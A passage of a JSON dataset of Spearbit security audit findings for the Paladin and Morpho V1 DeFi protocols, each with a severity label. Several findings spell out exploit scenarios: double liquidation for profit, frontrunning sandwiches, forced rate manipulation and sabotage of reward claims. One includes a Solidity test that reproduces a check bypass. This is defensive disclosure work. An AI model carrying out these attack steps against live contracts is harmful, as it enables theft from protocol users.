_getRemainingDuration(uint256 questID) internal view returns(uint256) { uint256 lastPeriod = questPeriods[questID][questPeriods[questID].length - 1]; return (lastPeriod - currentPeriod) / WEEK; // can revert }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Should make use of token.balanceOf(address(this)); to recover tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Currently when calling the recoverERC20() function there is no way to calculate what the proper amount should be without having to check the contracts balance of token before hand. This will require an extra step and can be easily done inside the function itself.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Floating pragma is set", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The current pragma Solidity directive is ^0.8.10. It is recommended to specify a specific compiler version to ensure that the byte code produced does not vary between builds. Contracts should be deployed using the same compiler version/flags with which they have been tested. Locking the pragma (for e.g. by not using ^ in pragma solidity 0.8.10) ensures that contracts do not accidentally get deployed using an older compiler version with known compiler bugs.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Deflationary reward tokens are not handled uniformly across the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The code base does not support rebasing/deflationary/inflationary reward tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Typo on comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Across the codebase, there is a typo on the comment. The comment can be seen from the below. * @dev Returns the number of periods to come for a give nQuest", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Require statement with gauge_types function call is redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The gauge_types function of the Curve reverts when an invalid gauge is given as a parameter, the QuestBoard: Invalid Gauge error message will not be seen in the QuestBoard contract. The documentation can be seen from the Querying Gauge and Type Weights. function createQuest(...) ... { ... require(IGaugeController(GAUGE_CONTROLLER).gauge_types(gauge) >= 0, \"QuestBoard: Invalid Gauge\"); ... }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Missing setter function for the GAUGE_CONTROLLER", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The GAUGE_CONTROLLER address is immutable and set in the constructor. If Curve adds a new version of the gauge controller, the value of GAUGE_CONTROLLER cannot be updated and the contract QuestBoard needs to be deployed again. address public immutable GAUGE_CONTROLLER; constructor(address _gaugeController, address _chest){ GAUGE_CONTROLLER = _gaugeController; ... }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Empty events emitted in killBoard() and unkillBoard() functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "When an event is emitted, it stores the arguments passed in for the transaction logs. Currently the Killed() and Unkilled() events are emitted without any arguments passed into them defeating the purpose of using an event.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Liquidating Morpho's Aave position leads to state desync", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Morpho has a single position on Aave that encompasses all of Morpho's individual user positions that are on the pool. When this Aave Morpho position is liquidated the user position state tracked in Morpho desyncs from the actual Aave position. This leads to issues when users try to withdraw their collateral or repay their debt from Morpho. It's also possible to double-liquidate for a profit. Example: There's a single borrower B1 on Morpho who is connected to the Aave pool. B1 supplies 1 ETH and borrows 2500 DAI. This creates a position on Aave for Morpho The ETH price crashes and the position becomes liquidatable. A liquidator liquidates the position on Aave, earning the liquidation bonus. They repaid some debt and seized some collateral for profit. This repaid debt / removed collateral is not synced with Morpho. The user's supply and debt balance remain 1 ETH and 2500 DAI. The same user on Morpho can be liquidated again because Morpho uses the exact same liquidation parameters as Aave. The Morpho liquidation call again repays debt on the Aave position and withdraws collateral with a second liquidation bonus. The state remains desynced.", "labels": ["Spearbit", "MorphoV1", "Severity: High Risk"]}, {"title": "A market could be deprecated but still prevent liquidators to liquidate borrowers if isLiquidateBor- rowPaused is true", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Currently, when a market must be deprecated, Morpho checks that borrowing has been paused before applying the new value for the flag. function setIsDeprecated(address _poolToken, bool _isDeprecated) external onlyOwner isMarketCreated(_poolToken) { } if (!marketPauseStatus[_poolToken].isBorrowPaused) revert BorrowNotPaused(); marketPauseStatus[_poolToken].isDeprecated = _isDeprecated; emit IsDeprecatedSet(_poolToken, _isDeprecated); The same check should be done in isLiquidateBorrowPaused, allowing the deprecation of a market only if isLiq- uidateBorrowPaused == false otherwise liquidators would not be able to liquidate borrowers on a deprecated market.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "setIsPausedForAllMarkets bypass the check done in setIsBorrowPaused and allow resuming borrow on a deprecated market", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The MorphoGovernance contract allow Morpho to set the isBorrowPaused to false only if the market is not deprecated. function setIsBorrowPaused(address _poolToken, bool _isPaused) external onlyOwner isMarketCreated(_poolToken) { } if (!_isPaused && marketPauseStatus[_poolToken].isDeprecated) revert MarketIsDeprecated(); marketPauseStatus[_poolToken].isBorrowPaused = _isPaused; emit IsBorrowPausedSet(_poolToken, _isPaused); This check is not enforced by the _setPauseStatus function, called by setIsPausedForAllMarkets allowing Mor- pho to resume borrowing for deprecated market. Test to reproduce the issue // SPDX-License-Identifier: AGPL-3.0-only pragma solidity ^0.8.0; import \"./setup/TestSetup.sol\"; contract TestSpearbit is TestSetup { using WadRayMath for uint256; function testBorrowPauseCheckSkipped() public { // Deprecate a market morpho.setIsBorrowPaused(aDai, true); morpho.setIsDeprecated(aDai, true); checkPauseEquality(aDai, true, true); // you cannot resume the borrowing if the market is deprecated hevm.expectRevert(abi.encodeWithSignature(\"MarketIsDeprecated()\")); morpho.setIsBorrowPaused(aDai, false); checkPauseEquality(aDai, true, true); // but this check is skipped if I call directly `setIsPausedForAllMarkets` morpho.setIsPausedForAllMarkets(false); // this should revert because // you cannot resume borrowing for a deprecated market checkPauseEquality(aDai, false, true); } function checkPauseEquality( address aToken, bool shouldBePaused, 6 bool shouldBeDeprecated ) public { ( bool isSupplyPaused, bool isBorrowPaused, bool isWithdrawPaused, bool isRepayPaused, bool isLiquidateCollateralPaused, bool isLiquidateBorrowPaused, bool isDeprecated ) = morpho.marketPauseStatus(aToken); assertEq(isBorrowPaused, shouldBePaused); assertEq(isDeprecated, shouldBeDeprecated); } }", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "User withdrawals can fail if Morpho position is close to liquidation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When trying to withdraw funds from Morpho as a P2P supplier the last step of the withdrawal algorithm borrows an amount from the pool (\"hard withdraw\"). If the Morpho position on Aave's debt / collateral value is higher than the market's max LTV ratio but lower than the market's liquidation threshold, the borrow will fail and the position can also not be liquidated. The withdrawals could fail.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "P2P borrowers' rate can be reduced", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Users on the pool currently earn a much worse rate than users with P2P credit lines. There's a queue for being connected P2P. As this queue could not be fully processed in a single transaction the protocol introduces the concept of a max iteration count and a borrower/supplier \"delta\" (c.f. yellow paper). This delta leads to a worse rate for existing P2P users. An attacker can force a delta to be introduced, leading to worse rates than before. Example: Imagine some borrowers are matched P2P (earning a low borrow rate), and many are still on the pool and therefore in the pool queue (earning a worse borrow rate from Aave).  An attacker supplies a huge amount, creating a P2P credit line for every borrower. (They can repeat this step several times if the max iterations limit is reached.) 7  The attacker immediately withdraws the supplied amount again. The protocol now attempts to demote the borrowers and reconnect them to the pool. But the algorithm performs a \"hard withdraw\" as the last step if it reaches the max iteration limit, creating a borrower delta. These are funds borrowed from the pool (at a higher borrowing rate) that are still wrongly recorded to be in a P2P position for some borrowers. This increase in borrowing rate is socialized equally among all P2P borrowers. (reflected in an updated p2pBorrowRate as the shareOfDelta increased.)  The initial P2P borrowers earn a worse rate than before. If the borrower delta is large, it's close to the on-pool rate.  If an attacker-controlled borrower account was newly matched P2P and not properly reconnected to the pool (in the \"demote borrowers\" step of the algorithm), they will earn a better P2P rate than the on-pool rate they earned before.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk Original"]}, {"title": "Frontrunners can exploit system by not allowing head of DLL to match in P2P", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "For a given asset x, liquidity is supplied on the pool since there are not enough borrowers. suppli- ersOnPool head: 0xa with 1000 units of x whenever there is a new transaction in the mempool to borrow 100 units of x,  Frontrunner supplies 1001 units of x and is supplied on pool.  updateSuppliers will put the frontrunner on the head (assuming very high gas is supplied).  Borrower's transaction lands and is matched 100 units of x with a frontrunner in p2p.  Frontrunner withdraws the remaining 901 left which was on the underlying pool. Favorable conditions for an attack:  Relatively fewer gas fees & relatively high block gas limit.  insertSorted is able to traverse to head within block gas limit (i.e length of DLL). Since this is a non-atomic sandwich, the frontrunner needs excessive capital for a block's time period.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Differences between Morpho and Compound borrow validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between them;  Compound has a mechanism to prevent borrows if the new borrowed amount would go above the current borrowCaps[cToken] threshold. Morpho does not check this threshold and could allow users to borrow on the P2P side (avoiding the revert because it would not trigger the underlying compound borrow action). Morpho should anyway monitor the borrowCaps of the market because it could make increaseP2PDeltasLogic and _unsafeWithdrawLogic reverts.  Both Morpho and Compound do not check if a market is in \"deprecated\" state. This means that as soon as a user borrows some tokens, he/she can be instantly liquidated by another user.  If the flag is true on Compound, the Morpho User can be liquidated directly on compound.  If the flag is true on Morpho, the borrower can be liquidated on Morpho.  Morpho does not check if borrowGuardianPaused[cToken] on Compound, a user could be able to borrow in P2P while the cToken market has borrow paused. More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Compound\".", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Users can continue to borrow from a deprecated market", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When a market is being marked as deprecated, there is no verification that the borrow for that market has already been disabled. This means a user could borrow from this market and immediately be eligible to be liquidated.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "ERC20 with transfer's fee are not handled by *PositionManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Some ERC20 tokens could have fees attached to the transfer event, while others could enable them in the future (see USDT, USDC). The current implementation of both PositionManager (for Aave and Compound) is not taking into consideration these types of ERC20 tokens. While Aave seems not to take into consideration this behavior (see LendingPool.sol), Compound, on the other hand, is explicitly handling it inside the doTransferIn function. Morpho is taking for granted that the amount specified by the user will be the amount transferred to the contract's balance, while in reality, the contract will receive less. In supplyLogic, for example, Morpho will account for the user's p2p/pool balance for the full amount but will repay/supply to the pool less than the amount accounted for.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Cannot liquidate Morpho users if no liquidity on the pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Morpho implements liquidations by repaying the borrowed asset and then withdrawing the collateral If there is no liquidity in the collateral asset pool the asset from the underlying protocol (Aave / Compound). liquidation will fail. Morpho could incur bad debt as they cannot liquidate the user. The liquidation mechanisms of Aave and Compound work differently: They allow the liquidator to seize the debtorsTokens/cTokens which can later be withdrawn for the underlying token once there is enough liquidity in the pool. Technically, an attacker could even force no liquidity on the pool by frontrunning liquidations by borrowing the entire pool amount - preventing them from being liquidated on Morpho. However, this would require significant capital as collateral in most cases.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Supplying and borrowing can recreate p2p credit lines even if p2p is disabled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When supplying/borrowing the algorithm tries to reduce the deltas p2pBorrowDelta/p2pSupplyDelta by moving borrowers/suppliers back to P2P. It is not checked if P2P is enabled. This has some consequences related to when governance disables P2P and wants to put users and liquidity back on the pool through increaseDelta calls. The users could enter P2P again by supplying and borrowing.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "In Compound implementation, P2P indexes can be stale", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current implementation of MorphoUtils._isLiquidatable loops through all of the tokens in which the user has supplied to/borrowed from. The scope of the function is to check whether the user can be liquidated or not by verifying that debtValue > maxDebtValue. Resolving \"Compound liquidity computation uses outdated cached borrowIndex\" implies that the Compound bor- row index used is always up-to-date but the P2P issues associated with the token could still be out of date if the market has not been used recently, and the underlying Compound indexes (on which the P2P index is based) has changed a lot. As a consequence, all the functions that rely on _isLiquidatable (liquidate, withdraw, borrow) could return a wrong result if the majority of the user's balance is on the P2P balance (the problem is even more aggravated without resolving \"Compound liquidity computation uses outdated cached borrowIndex\". Let's say, for example:  Alice supplies ETH in pool  Alice supplies BAT in P2P  Alice borrows some DAI At some point in time the ETH value goes down, but the interest rate of BAT goes up. If the P2P index of BAT had been correctly up-to-date, Alice would have been still solvent, but she gets liquidated by Bob who calls liq- uidate(alice, ETH, DAI) Even by fixing \"Compound liquidity computation uses outdated cached borrowIndex\" Alice would still be liquidated because her entire collateral is on P2P and not in the pool.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Turning off an asset as collateral on Morpho-Aave still allows seizing of that collateral on Morpho and leads to liquidations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho Aave deployment can set the asset to not be used as collateral for Aave's Morpho contract position. On Aave, this prevents liquidators from seizing this asset as collateral. 1. However, this prevention does not extend to users on Morpho as Morpho has not implemented this check. Liquidations are performed through a repay & withdraw combination and withdrawing the asset on Aave is still allowed. 2. When turning off the asset as collateral, the single Morpho contract position on Aave might still be over- collateralized, but some users on Morpho suddenly lose this asset as collateral (LTV becomes 0) and will be liquidated.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "claimToTreasury(COMP) steals users' COMP rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The claimToTreasury function can send a market's underlying tokens that have been accumulated in the contract to the treasury. This is intended to be used for the reserve amounts that accumulate in the contract from P2P matches. However, Compound also pays out rewards in COMP and COMP is a valid Compound market. Sending the COMP reserves will also send the COMP rewards. This is especially bad as anyone can claim COMP rewards on the behalf of Morpho at any time and the rewards will be sent to the contract. An attacker could even frontrun a claimToTreasury(cCOMP) call with a Comptroller.claimComp(morpho, [cComp]) call to sabotage the reward system. Users won't be able to claim their rewards.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "Compound liquidity computation uses outdated cached borrowIndex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The _isLiquidatable iterates over all user-entered markets and calls _getUserLiquidity- DataForAsset(poolToken) -> _getUserBorrowBalanceInOf(poolToken). However, it only updates the indexes of markets that correspond to the borrow and collateral assets. The _getUserBorrowBalanceInOf function computes the underlying pool amount of the user as userBorrowBalance.onPool.mul(lastPoolIndexes[_- poolToken].lastBorrowPoolIndex);. Note that lastPoolIndexes[_poolToken].lastBorrowPoolIndex is a value that was cached by Morpho and it can be outdated if there has not been a user-interaction with that market for a long time. The liquidation does not match Compound's liquidation anymore and users might not be liquidated on Morpho that could be liquidated on Compound. Liquidators would first need to trigger updates to Morpho's internal borrow indexes.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "HeapOrdering.getNext returns the root node for nodes not in the list", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "If an id does not exist in the HeapOrdering the getNext() function will return the root node uint256 rank = _heap.ranks[_id]; // @audit returns 0 as rank. rank + 1 will be the root if (rank < _heap.accounts.length) return getAccount(_heap, rank + 1).id; else return address(0);", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "Heap only supports balances up to type(uint96).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current heap implementation packs an address and the balance into a single storage slot which If a token has 18 decimals, the largest restricts the balance to the uint96 type with a max value of ~7.9e28. balance that can be stored will be 7.9e10. This could lead to problems with a token of low value, for example, if 1.0 tokens are worth 0.0001$, a user could only store 7_900_000$.", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "Delta leads to incorrect reward distributions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Delta describes the amount that is on the pool but still wrongly tracked as inP2P for some users. There are users that do not have their P2P balance updated to an equivalent pool balance and therefore do not earn rewards. There is now a mismatch of this delta between the pool balance that earns a reward and the sum of pool balances that are tracked in the reward manager to earn that reward. The increase in delta directly leads to an increase in rewards for all other users on the pool.", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "When adding a new rewards manager, users already on the pool won't be earning rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When setting a new rewards manager, existing users that are already on the pool are not tracked and won't be earning rewards.", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "liquidationThreshold computation can be moved for gas efficiency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The vars.liquidationThreshold computation is only relevant if the user is supplying this asset. Therefore, it can be moved to the if (_isSupplying(vars.userMarkets, vars.borrowMask)) branch.", "labels": ["Spearbit", "MorphoV1", "Severity: Gas Optimization"]}, {"title": "Add max approvals to markets upon market creation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Approvals to the Compound markets are set on each supplyToPool function call.", "labels": ["Spearbit", "MorphoV1", "Severity: Gas Optimization"]}, {"title": "isP2PDisabled flag is not updated by setIsPausedForAllMarkets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current implementation of _setPauseStatus does not update the isP2PDisabled. When _- isPaused = false this is not a real problem because once all the flags are enabled (everything is paused), all the operations will be blocked at the root of the execution of the process. There might be cases instead where isP2PDisabled and the other flags were disabled for a market and Morpho want to enable all of them, resuming all the operations and allowing the users to continue P2P usage. In this case, Morpho would only resume operations without allowing the users to use the P2P flow. function _setPauseStatus(address _poolToken, bool _isPaused) internal { Types.MarketPauseStatus storage pause = marketPauseStatus[_poolToken]; pause.isSupplyPaused = _isPaused; pause.isBorrowPaused = _isPaused; pause.isWithdrawPaused = _isPaused; pause.isRepayPaused = _isPaused; pause.isLiquidateCollateralPaused = _isPaused; pause.isLiquidateBorrowPaused = _isPaused; // ... event emissions }", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave liquidate validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implements the liquidate function as a mix of  repay + supply operations on Aave executed inside _unsafeRepayLogic where needed  withdraw + borrow operations on Aave executed inside _unsafeWithdrawLogic where needed From _unsafeRepayLogic (repay + supply on pool where needed)  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true) for the _poolTokenBorrowed  Morpho is not checking that the Aave borrowAsset has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert 16  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to borrow that amount to Aave would make the whole tx revert From _unsafeWithdrawLogic (withdraw + borrow on pool where needed)  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false) for the _poolTokenCol- lateral  Morpho is not checking that the Aave collateralAsset has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave repay validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the repay function as a mix of repay + supply operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to supply that amount to Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave withdraw validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the withdraw function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert Note 1: Aave is NOT checking that the market isFrozen. This means that users can withdraw even if the market is active but frozen More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave borrow validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logics Note: Morpho re-implement the borrow function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Morpho is not checking that the Aave market has isFrozen == false (check done by Aave on the borrow operation), users could be able to borrow in P2P even if the borrow is paused on Aave (isFrozen == true) because Morpho would only call the aave.withdraw (where the frozen flag is not checked)  Morpho do not check if market is active (would borrowingEnabled == false if market is not active?)  Morpho do not check if market is frozen (would borrowingEnabled == false if market is not frozen?)  Morpho do not check that healthFactor > GenericLogic.HEALTH_FACTOR_LIQUIDATION_THRESHOLD  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}]